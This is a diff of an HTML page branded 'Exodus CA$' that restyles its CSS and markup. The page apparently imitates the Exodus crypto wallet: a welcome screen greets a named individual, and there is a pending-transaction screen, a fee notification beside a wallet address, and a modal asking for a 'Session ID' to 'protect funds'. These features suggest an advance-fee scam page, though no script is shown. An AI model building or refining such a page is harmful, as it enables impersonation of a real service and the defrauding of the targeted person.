@@ -1,3 +1,4 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,964 +6,114 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Exodus CA$</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", sans-serif;
-    }
-
-    html, body {
-      width: 100%;
-      height: 100%;
-    }
-
-    body {
-      background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%);
-      color: #e2e8f0;
-      min-height: 100vh;
-      overflow-x: hidden;
-    }
-
-    a {
-      text-decoration: none;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", sans-serif; }
+    html, body { width: 100%; height: 100%; }
+    body { background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%); color: #e2e8f0; min-height: 100vh; overflow-x: hidden; }
+    a { text-decoration: none; }
 
     /* ===== WELCOME SCREEN ===== */
-    .welcome-screen {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 4000;
-      transition: opacity 1.2s ease;
-      opacity: 1;
-    }
-
-    .welcome-screen.fade-out {
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    .welcome-content {
-      text-align: center;
-      color: white;
-    }
-
-    .welcome-icon {
-      font-size: 82px;
-      margin-bottom: 1.5rem;
-      animation: slideDown 1s ease;
-    }
-
-    .welcome-title {
-      font-size: 52px;
-      font-weight: 700;
-      letter-spacing: -1px;
-      margin-bottom: 10px;
-      animation: slideDown 1s ease 0.3s both;
-    }
-
-    .welcome-message {
-      font-size: 22px;
-      color: #cbd5e0;
-      margin-bottom: 2rem;
-      animation: slideDown 1s ease 0.6s both;
-    }
-
-    .welcome-loader {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      animation: slideDown 1s ease 0.9s both;
-    }
-
-    .loader-dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      background: #f7931a;
-      animation: bounceSmooth 2s infinite;
-    }
-
-    .loader-dot:nth-child(1) { animation-delay: 0s; }
-    .loader-dot:nth-child(2) { animation-delay: 0.3s; }
-    .loader-dot:nth-child(3) { animation-delay: 0.6s; }
-
-    @keyframes slideDown {
-      from {
-        transform: translateY(-50px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    @keyframes bounceSmooth {
-      0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
-      40% { transform: scale(1); opacity: 1; }
-    }
+    .welcome-screen { position: fixed; inset: 0; background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%); display: flex; align-items: center; justify-content: center; z-index: 4000; transition: opacity 1s ease; opacity: 1; }
+    .welcome-screen.fade-out { opacity: 0; pointer-events: none; }
+    .welcome-content { text-align: center; color: white; max-width: 680px; padding: 20px; }
+    .welcome-badge { width: 110px; height: 110px; border-radius: 20px; background: linear-gradient(135deg, #f7931a, #e08f0f); display: inline-flex; align-items: center; justify-content: center; font-size: 44px; color: #071022; font-weight: 800; box-shadow: 0 18px 50px rgba(0,0,0,0.6); margin-bottom: 18px; }
+    .welcome-title { font-size: 28px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 6px; }
+    .welcome-message { font-size: 15px; color: #cbd5e0; margin-bottom: 10px; }
+    .welcome-loader { display: flex; justify-content: center; gap: 10px; margin-top: 8px; }
+    .loader-dot { width: 12px; height: 12px; border-radius: 50%; background: #f7931a; animation: bounceSmooth 1.4s infinite; }
+    .loader-dot:nth-child(2) { animation-delay: 0.12s; } .loader-dot:nth-child(3) { animation-delay: 0.24s; }
+    @keyframes bounceSmooth { 0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; } 40% { transform: scale(1); opacity: 1; } }
 
     /* ===== NAVBAR ===== */
-    .navbar {
-      height: 72px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 2rem;
-      background: rgba(15, 23, 42, 0.8);
-      backdrop-filter: blur(12px);
-      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-    }
+    .navbar { height: 72px; display:flex; align-items:center; justify-content:space-between; padding: 0 20px; background: rgba(15,23,42,0.8); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255,255,255,0.06); position: sticky; top:0; z-index: 1000; }
+    .navbar-left { display:flex; align-items:center; gap:14px; }
+    .canada-flag { width:26px; height:16px; display:flex; align-items:center; justify-content:center; font-size:12px; border-radius:2px; background: linear-gradient(90deg, #ff0000 0%, #ff0000 33%, white 33%, white 66%, #ff0000 66%, #ff0000 100%); }
+    .navbar-brand { font-size:20px; font-weight:800; color:#f7931a; display:flex; gap:8px; align-items:center; }
+    .user-profile { display:flex; align-items:center; gap:12px; }
+    .user-avatar { width:44px; height:44px; border-radius:10px; background: linear-gradient(135deg,#f7931a,#e08f0f); display:flex; align-items:center; justify-content:center; color:#071022; font-weight:800; }
+    .user-name { font-size:14px; font-weight:700; color:#e2e8f0; }
+    .user-status { font-size:12px; color:#94a3b8; }
 
-    .navbar-brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: #f7931a;
-      font-size: 24px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-    }
+    /* ===== CONTAINER ===== */
+    .container { max-width:1180px; margin: 28px auto; padding: 24px; }
+    .page-header { text-align:left; margin-bottom:18px; }
+    .page-title { font-size:28px; font-weight:800; color:#f8fafc; margin-bottom:6px; }
+    .page-subtitle { color:#94a3b8; font-size:14px; }
 
-    .navbar-left {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-    }
-
-    .canada-flag {
-      width: 24px;
-      height: 16px;
-      background: linear-gradient(90deg, #ff0000 0%, #ff0000 33%, white 33%, white 66%, #ff0000 66%, #ff0000 100%);
-      border-radius: 2px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 10px;
-    }
-
-    .user-profile {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .user-avatar {
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #f7931a, #e08f0f);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 700;
-      color: white;
-      font-size: 14px;
-    }
-
-    .user-name {
-      font-size: 14px;
-      font-weight: 600;
-      color: #e2e8f0;
-    }
-
-    .user-status {
-      font-size: 12px;
-      color: #94a3b8;
-    }
-
-    /* ===== MAIN CONTAINER ===== */
-    .container {
-      max-width: 1020px;
-      margin: 0 auto;
-      padding: 3rem 2rem 4rem;
-    }
-
-    .page-header {
-      text-align: center;
-      margin-bottom: 2.5rem;
-    }
-
-    .page-title {
-      font-size: 38px;
-      font-weight: 700;
-      letter-spacing: -1px;
-      color: #f8fafc;
-      margin-bottom: 8px;
-    }
-
-    .page-subtitle {
-      color: #94a3b8;
-      font-size: 16px;
-    }
+    /* ===== LAYOUT GRID ===== */
+    .grid { display:grid; grid-template-columns: 1fr 380px; gap:20px; align-items:start; }
+    @media (max-width: 980px) { .grid { grid-template-columns: 1fr; } }
 
     /* ===== TRANSACTION CARD ===== */
-    .transaction-card {
-      background: linear-gradient(135deg, rgba(30, 41, 59, 0.85), rgba(20, 29, 47, 0.85));
-      border: 1px solid rgba(247, 147, 26, 0.15);
-      border-radius: 22px;
-      padding: 3rem 2rem;
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.22);
-      margin-bottom: 2rem;
-      animation: fadeUpSlow 1s ease;
-      position: relative;
-      overflow: hidden;
-    }
+    .transaction-card { background: linear-gradient(180deg, rgba(10,14,22,0.6), rgba(12,16,22,0.45)); padding: 26px; border-radius: 14px; border:1px solid rgba(255,255,255,0.03); box-shadow: 0 24px 60px rgba(2,6,23,0.6); }
+    .transaction-label { color:#94a3b8; text-transform:uppercase; font-size:12px; font-weight:800; margin-bottom:8px; }
+    .transaction-type { display:flex; align-items:center; gap:10px; font-weight:700; color:#cbd5e0; margin-bottom:12px; }
+    .transaction-amount { font-size:40px; font-weight:900; color:#fff; }
+    .transaction-currency { color:#f7931a; font-weight:800; font-size:18px; margin-left:8px; }
+    .transaction-divider { height:1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.02), transparent); margin: 14px 0; }
+    .btc-value { color:#f7931a; font-weight:700; margin-bottom:6px; }
 
-    .transaction-card::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.5), transparent);
-    }
+    /* ===== INFO BOXES ===== */
+    .info-grid { display:grid; grid-template-columns: repeat(2,1fr); gap:12px; margin-top:12px; }
+    .info-box { padding:12px; border-radius:10px; background: rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.02); }
+    .info-label { color:#94a3b8; font-size:12px; font-weight:800; text-transform:uppercase; margin-bottom:6px; }
+    .info-value { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Courier New", monospace; font-weight:800; color:#e2e8f0; }
 
-    @keyframes fadeUpSlow {
-      from {
-        opacity: 0;
-        transform: translateY(40px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
+    /* ===== WALLET PANEL (RIGHT) ===== */
+    .wallet-panel { padding:16px; border-radius:12px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.03); box-shadow: 0 18px 40px rgba(2,6,23,0.55); position:relative; }
+    .wallet-title { font-weight:800; color:#e2e8f0; margin-bottom:8px; }
+    .wallet-sub { color:#94a3b8; font-size:12px; margin-bottom:10px; }
+    .wallet-address { background: rgba(30,41,59,0.6); padding:12px; border-radius:10px; font-family:ui-monospace,monospace; color:#e2e8f0; word-break:break-all; border:1px solid rgba(255,255,255,0.03); }
+    .wallet-actions { display:flex; gap:8px; margin-top:12px; }
 
-    .transaction-label {
-      text-transform: uppercase;
-      letter-spacing: 1.2px;
-      color: #94a3b8;
-      font-size: 11px;
-      font-weight: 700;
-      margin-bottom: 12px;
-    }
-
-    .transaction-type {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      font-weight: 600;
-      color: #cbd5e0;
-      margin-bottom: 1.5rem;
-      font-size: 16px;
-    }
-
-    .transaction-icon {
-      font-size: 32px;
-      color: #f7931a;
-    }
-
-    .amount-row {
-      display: flex;
-      align-items: baseline;
-      justify-content: center;
-      gap: 8px;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-
-    .transaction-amount {
-      font-size: clamp(48px, 6vw, 68px);
-      font-weight: 800;
-      letter-spacing: -2px;
-      color: #f8fafc;
-    }
-
-    .transaction-currency {
-      font-size: 24px;
-      color: #f7931a;
-      font-weight: 700;
-    }
-
-    .transaction-divider {
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.3), transparent);
-      margin: 1.8rem 0;
-    }
-
-    .btc-value {
-      color: #f7931a;
-      font-size: 16px;
-      text-align: center;
-      font-weight: 600;
-    }
-
-    /* ===== STATUS BADGE ===== */
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: rgba(168, 85, 247, 0.15);
-      border: 1px solid rgba(168, 85, 247, 0.4);
-      color: #d8b4fe;
-      padding: 8px 16px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-top: 12px;
-      justify-content: center;
-      animation: fadeInDown 1s ease;
-    }
-
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #a855f7;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.5; }
-    }
-
-    @keyframes fadeInDown {
-      from {
-        opacity: 0;
-        transform: translateY(-10px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    /* ===== INFO GRID ===== */
-    .details-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 1.25rem;
-      margin-bottom: 1.5rem;
-    }
-
-    .info-box {
-      background: rgba(15, 23, 42, 0.56);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 14px;
-      padding: 1.2rem 1.25rem;
-      transition: all 0.3s ease;
-      animation: fadeUpSlow 1.2s ease;
-    }
-
-    .info-box:hover {
-      border-color: rgba(247, 147, 26, 0.2);
-      background: rgba(15, 23, 42, 0.7);
-    }
-
-    .info-label {
-      color: #94a3b8;
-      text-transform: uppercase;
-      letter-spacing: 0.7px;
-      font-size: 11px;
-      margin-bottom: 8px;
-      font-weight: 700;
-    }
-
-    .info-value {
-      color: #e2e8f0;
-      font-size: 15px;
-      font-weight: 600;
-      word-break: break-word;
-      font-family: "Courier New", monospace;
-    }
-
-    /* ===== WALLET BLOCK ===== */
-    .wallet-block {
-      background: rgba(15, 23, 42, 0.56);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 14px;
-      padding: 1.2rem 1.25rem;
-      margin-bottom: 1.5rem;
-      transition: all 0.3s ease;
-      animation: fadeUpSlow 1.3s ease;
-    }
-
-    .wallet-block:hover {
-      border-color: rgba(247, 147, 26, 0.2);
-      background: rgba(15, 23, 42, 0.7);
-    }
-
-    .wallet-address {
-      color: #e2e8f0;
-      font-size: 13px;
-      word-break: break-all;
-      font-family: "Courier New", monospace;
-      background: rgba(30, 41, 59, 0.7);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 10px;
-      padding: 12px;
-      margin-top: 8px;
-      line-height: 1.6;
-    }
-
-    /* ===== BUTTONS ===== */
-    .button-group {
-      display: flex;
-      gap: 1rem;
-      flex-wrap: wrap;
-      margin-top: 2rem;
-      animation: fadeUpSlow 1.4s ease;
-    }
-
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 48px;
-      padding: 14px 24px;
-      border-radius: 12px;
-      border: none;
-      cursor: pointer;
-      font-size: 15px;
-      font-weight: 700;
-      transition: all 0.4s ease;
-      text-decoration: none;
-    }
-
-    .btn-primary {
-      background: linear-gradient(135deg, #f7931a 0%, #e08f0f 100%);
-      color: white;
-      flex: 1;
-      min-width: 220px;
-      box-shadow: 0 10px 30px rgba(247, 147, 26, 0.25);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .btn-primary::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-      transition: left 1s ease;
-    }
-
-    .btn-primary:hover::before {
-      left: 100%;
-    }
-
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 14px 35px rgba(247, 147, 26, 0.35);
-    }
-
-    .btn-primary:active {
-      transform: translateY(0);
-    }
-
-    .btn-support {
-      background: transparent;
-      color: #f7931a;
-      border: 2px solid #f7931a;
-      padding: 12px 20px;
-      min-width: 180px;
-      transition: all 0.4s ease;
-    }
-
-    .btn-support:hover {
-      background: rgba(247, 147, 26, 0.1);
-      border-color: #f7931a;
-    }
-
-    .btn-loading {
-      position: relative;
-      color: transparent;
-    }
-
-    .btn-loading::after {
-      content: '';
-      position: absolute;
-      width: 18px;
-      height: 18px;
-      top: 50%;
-      left: 50%;
-      margin-left: -9px;
-      margin-top: -9px;
-      border: 2.5px solid rgba(255, 255, 255, 0.25);
-      border-radius: 50%;
-      border-top-color: white;
-      border-right-color: white;
-      animation: spinSmooth 1.2s linear infinite;
-    }
-
-    @keyframes spinSmooth {
-      to { transform: rotate(360deg); }
-    }
+    .btn { padding:10px 12px; border-radius:10px; border:none; cursor:pointer; font-weight:800; }
+    .btn.primary { background: linear-gradient(135deg,#f7931a,#e08f0f); color:#071022; }
+    .btn.ghost { background: transparent; border:1px solid rgba(255,255,255,0.04); color:#f7931a; }
 
     /* ===== MODAL ===== */
-    .modal-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.8);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.4s ease;
-      z-index: 2000;
-      backdrop-filter: blur(5px);
-    }
-
-    .modal-overlay.show {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    .modal-content {
-      width: min(620px, 100%);
-      background: linear-gradient(180deg, rgba(30, 41, 59, 0.96), rgba(15, 23, 42, 0.96));
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 20px;
-      padding: 2rem 1.5rem 1.5rem;
-      position: relative;
-      box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5);
-      animation: modalInSlow 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-
-    @keyframes modalInSlow {
-      from {
-        transform: translateY(60px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    .modal-close {
-      position: absolute;
-      top: 16px;
-      right: 16px;
-      width: 38px;
-      height: 38px;
-      border: none;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.08);
-      color: #e2e8f0;
-      font-size: 22px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-
-    .modal-close:hover {
-      background: rgba(247, 147, 26, 0.2);
-      color: #f7931a;
-    }
-
-    .modal-header {
-      margin-bottom: 1.5rem;
-      padding-right: 42px;
-    }
-
-    .modal-title {
-      font-size: 28px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-      color: #f8fafc;
-      margin-bottom: 5px;
-    }
-
-    .modal-subtitle {
-      font-size: 14px;
-      color: #94a3b8;
-    }
-
-    .wallet-card {
-      background: rgba(15, 23, 42, 0.6);
-      border: 1px solid rgba(255, 255, 255, 0.07);
-      border-radius: 14px;
-      padding: 1rem;
-      margin-bottom: 1rem;
-    }
-
-    .wallet-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      padding: 0.9rem 0;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-    }
-
-    .wallet-row:last-child {
-      border-bottom: none;
-    }
-
-    .wallet-label {
-      color: #94a3b8;
-      text-transform: uppercase;
-      letter-spacing: 0.7px;
-      font-size: 11px;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-
-    .wallet-value {
-      color: #e2e8f0;
-      font-family: "Courier New", monospace;
-      word-break: break-all;
-      text-align: right;
-      font-size: 13px;
-      font-weight: 600;
-    }
-
-    .warning-box {
-      margin: 1.2rem 0 1.5rem;
-      background: rgba(247, 147, 26, 0.08);
-      border: 1px solid rgba(247, 147, 26, 0.22);
-      color: #f1f5f9;
-      border-radius: 10px;
-      padding: 1rem;
-      font-size: 13px;
-      line-height: 1.6;
-    }
-
-    .modal-actions {
-      display: flex;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-
-    .modal-actions .btn {
-      flex: 1;
-      min-width: 140px;
-    }
-
-    .btn-secondary {
-      background: transparent;
-      border: 2px solid #f7931a;
-      color: #f7931a;
-    }
-
-    .btn-secondary:hover {
-      background: rgba(247, 147, 26, 0.1);
-    }
+    .modal-overlay { position: fixed; inset:0; display:none; align-items:center; justify-content:center; background: rgba(0,0,0,0.5); z-index: 4000; }
+    .modal-overlay.show { display:flex; }
+    .modal { width: min(640px, 96%); background: linear-gradient(180deg, rgba(15,23,42,0.96), rgba(10,14,22,0.96)); padding:20px; border-radius:12px; border:1px solid rgba(255,255,255,0.04); box-shadow:0 30px 80px rgba(0,0,0,0.6); }
+    .modal h3 { font-size:20px; margin-bottom:8px; }
+    .modal p { color:#94a3b8; font-size:14px; margin-bottom:12px; }
+    .form-row { display:flex; gap:8px; align-items:center; }
+    .form-row input { flex:1; padding:10px 12px; border-radius:10px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#e2e8f0; }
+    .error { margin-top:10px; background: rgba(255,77,79,0.08); border:1px solid rgba(255,77,79,0.16); color:#ffd7d9; padding:10px; border-radius:8px; display:none; }
 
     /* ===== NOTIFICATION ===== */
-    .notification-dropdown {
-      position: fixed;
-      top: 78px;
-      right: 20px;
-      width: min(420px, calc(100vw - 28px));
-      background: rgba(15, 23, 42, 0.97);
-      border: 1px solid rgba(247, 147, 26, 0.25);
-      border-radius: 16px;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
-      padding: 1.2rem;
-      z-index: 3000;
-      opacity: 0;
-      transform: translateY(-480px);
-      transition: all 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
-      pointer-events: none;
-    }
-
-    .notification-dropdown.show {
-      opacity: 1;
-      transform: translateY(0);
-      pointer-events: auto;
-    }
-
-    .notification-header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 12px;
-    }
-
-    .notification-icon {
-      font-size: 28px;
-      animation: float 3s ease-in-out infinite;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-8px); }
-    }
-
-    .notification-title {
-      color: #f7931a;
-      font-weight: 700;
-      font-size: 16px;
-    }
-
-    .notification-close-btn {
-      position: absolute;
-      top: 12px;
-      right: 12px;
-      width: 28px;
-      height: 28px;
-      border: none;
-      background: rgba(255, 255, 255, 0.1);
-      color: #e2e8f0;
-      border-radius: 50%;
-      cursor: pointer;
-      font-size: 18px;
-      transition: all 0.2s ease;
-    }
-
-    .notification-close-btn:hover {
-      background: rgba(247, 147, 26, 0.2);
-      color: #f7931a;
-    }
-
-    .notification-message {
-      color: #cbd5e0;
-      font-size: 14px;
-      line-height: 1.6;
-      margin-bottom: 12px;
-    }
-
-    .notification-certificate {
-      width: 100%;
-      height: 220px;
-      object-fit: cover;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      display: block;
-      margin-bottom: 12px;
-      background: #0b1120;
-      animation: imageSlideIn 0.8s ease;
-    }
-
-    @keyframes imageSlideIn {
-      from {
-        opacity: 0;
-        transform: scale(0.9);
-      }
-      to {
-        opacity: 1;
-        transform: scale(1);
-      }
-    }
-
-    .notification-fee {
-      background: rgba(247, 147, 26, 0.1);
-      border-left: 3px solid #f7931a;
-      border-radius: 10px;
-      padding: 12px;
-      margin-bottom: 10px;
-      color: #f8fafc;
-      font-size: 16px;
-      font-weight: 700;
-    }
-
-    .notification-address {
-      background: rgba(247, 147, 26, 0.05);
-      border-left: 3px solid #f7931a;
-      border-radius: 10px;
-      padding: 12px;
-      color: #dbeafe;
-      font-family: "Courier New", monospace;
-      font-size: 12px;
-      word-break: break-all;
-      line-height: 1.5;
-    }
+    .notification-dropdown { position: fixed; top: 78px; right: 20px; width: min(420px, calc(100vw - 28px)); background: rgba(15,23,42,0.98); border:1px solid rgba(255,255,255,0.04); border-radius:12px; padding:14px; z-index:3000; box-shadow:0 30px 80px rgba(0,0,0,0.6); pointer-events:auto; }
+    .notification-header { display:flex; gap:10px; align-items:center; margin-bottom:8px; }
+    .notification-title { color:#f7931a; font-weight:900; }
+    .notification-message { color:#cbd5e0; font-size:13px; margin-bottom:8px; }
+    .notification-fee { background: rgba(247,147,26,0.06); padding:10px; border-radius:8px; font-weight:800; margin-bottom:8px; display:flex; justify-content:space-between; align-items:center; }
+    .notification-address { background: rgba(255,255,255,0.02); padding:10px; border-radius:8px; font-family: ui-monospace,monospace; font-size:13px; color:#dbeafe; word-break:break-all; margin-bottom:8px; }
+    .notification-actions { display:flex; gap:8px; margin-top:6px; }
+    .notification-gif { position:absolute; right:10px; bottom:10px; width:64px; height:64px; border-radius:50%; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
 
     /* ===== PENDING PAGE ===== */
-    .pending-page {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      z-index: 5000;
-      text-align: center;
-      gap: 1.8rem;
-      padding: 2rem;
-      opacity: 0;
-      transition: opacity 0.8s ease;
-      overflow-y: auto;
-    }
+    .pending-page { position: fixed; inset: 0; background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%); display: none; align-items:center; justify-content:center; z-index:5000; padding:24px; color:#e2e8f0; }
+    .pending-page.show { display:flex; }
+    .pending-card { width: min(780px, 96%); background: linear-gradient(180deg, rgba(15,23,42,0.9), rgba(10,14,22,0.9)); padding:26px; border-radius:12px; border:1px solid rgba(255,255,255,0.04); box-shadow:0 30px 80px rgba(0,0,0,0.6); text-align:center; }
+    .pending-spinner { width:96px; height:96px; border-radius:50%; background: linear-gradient(135deg,#f7931a,#e08f0f); display:flex; align-items:center; justify-content:center; font-size:36px; color:#071022; margin:0 auto 12px; box-shadow:0 20px 60px rgba(0,0,0,0.4); }
+    .pending-title { font-size:22px; font-weight:900; margin-bottom:6px; }
+    .pending-status { color:#a855f7; font-weight:800; margin-bottom:8px; }
+    .pending-amount { color:#f7931a; font-weight:900; font-size:28px; margin-bottom:6px; }
+    .pending-details { margin-top:12px; color:#cbd5e0; font-size:13px; }
 
-    .pending-page.show {
-      display: flex;
-      opacity: 1;
-    }
-
-    .pending-spinner {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #f7931a, #e08f0f);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 44px;
-      color: white;
-      animation: spinCircle 2s linear infinite;
-      box-shadow: 0 25px 60px rgba(247, 147, 26, 0.3);
-      flex-shrink: 0;
-      position: relative;
-    }
-
-    .pending-spinner::before {
-      content: '';
-      position: absolute;
-      width: 120px;
-      height: 120px;
-      border-radius: 50%;
-      border: 2px solid rgba(247, 147, 26, 0.2);
-      animation: spinOuter 3s linear infinite reverse;
-    }
-
-    @keyframes spinCircle {
-      to { transform: rotate(360deg); }
-    }
-
-    @keyframes spinOuter {
-      to { transform: rotate(360deg); }
-    }
-
-    .pending-title {
-      font-size: 36px;
-      font-weight: 800;
-      letter-spacing: -1px;
-      color: #f8fafc;
-      animation: fadeInUpSlow 0.8s ease 0.2s both;
-    }
-
-    .pending-status {
-      color: #a855f7;
-      font-size: 16px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      animation: fadeInUpSlow 0.8s ease 0.3s both;
-    }
-
-    .pending-amount {
-      color: #f7931a;
-      font-size: 56px;
-      font-weight: 800;
-      letter-spacing: -1.5px;
-      animation: fadeInUpSlow 0.8s ease 0.4s both;
-    }
-
-    .pending-btc {
-      color: #cbd5e0;
-      font-size: 18px;
-      font-weight: 600;
-      animation: fadeInUpSlow 0.8s ease 0.5s both;
-    }
-
-    .pending-details {
-      max-width: 520px;
-      background: rgba(15, 23, 42, 0.6);
-      border: 1px solid rgba(247, 147, 26, 0.15);
-      border-radius: 14px;
-      padding: 1.2rem 1.5rem;
-      color: #cbd5e0;
-      font-size: 14px;
-      line-height: 1.8;
-      animation: fadeInUpSlow 0.8s ease 0.6s both;
-    }
-
-    .pending-certificate {
-      width: min(420px, 100%);
-      height: 240px;
-      object-fit: cover;
-      border-radius: 14px;
-      border: 1px solid rgba(247, 147, 26, 0.2);
-      flex-shrink: 0;
-      animation: fadeInUpSlow 0.8s ease 0.7s both;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
-    }
-
-    @keyframes fadeInUpSlow {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .navbar {
-        padding: 0 1rem;
-      }
-
-      .container {
-        padding: 2rem 1rem 3rem;
-      }
-
-      .details-grid {
-        grid-template-columns: 1fr;
-      }
-
-      .btn-primary, .btn-support, .modal-actions .btn {
-        width: 100%;
-      }
-
-      .button-group {
-        flex-direction: column;
-      }
-
-      .notification-dropdown {
-        right: 10px;
-        top: 72px;
-        width: calc(100vw - 20px);
-      }
-
-      .page-title {
-        font-size: 28px;
-      }
-
-      .pending-amount {
-        font-size: 44px;
-      }
-
-      .navbar-left {
-        gap: 12px;
-      }
-
-      .pending-spinner {
-        width: 90px;
-        height: 90px;
-        font-size: 40px;
-      }
-
-      .pending-spinner::before {
-        width: 110px;
-        height: 110px;
-      }
+    @media (max-width:640px) {
+      .notification-dropdown { left: 12px; right: 12px; top: 72px; width: auto; }
+      .grid { grid-template-columns: 1fr; }
+      .wallet-panel { order: -1; }
     }
   </style>
 </head>
 <body>
   <!-- Welcome screen -->
-  <div class="welcome-screen" id="welcomeScreen">
-    <div class="welcome-content">
-      <div class="welcome-icon">₿</div>
-      <h1 class="welcome-title">Welcome Back</h1>
-      <p class="welcome-message">Stan Ottembrajt</p>
-      <div class="welcome-loader">
+  <div class="welcome-screen" id="welcomeScreen" aria-hidden="false">
+    <div class="welcome-content" role="status" aria-live="polite">
+      <div class="welcome-badge">₿</div>
+      <div class="welcome-title">Welcome back, Stan Ottembrajt</div>
+      <div class="welcome-message">Professional settlement flow — verify with a Session ID to protect funds and ensure accurate reconciliation.</div>
+      <div class="welcome-loader" aria-hidden="true">
         <div class="loader-dot"></div>
         <div class="loader-dot"></div>
         <div class="loader-dot"></div>
@@ -971,12 +122,12 @@
   </div>
 
   <!-- Navbar -->
-  <nav class="navbar">
+  <nav class="navbar" role="navigation" aria-label="Main navigation">
     <div class="navbar-left">
       <div class="canada-flag">🍁</div>
       <div class="navbar-brand">₿ Exodus</div>
     </div>
-    <div class="user-profile">
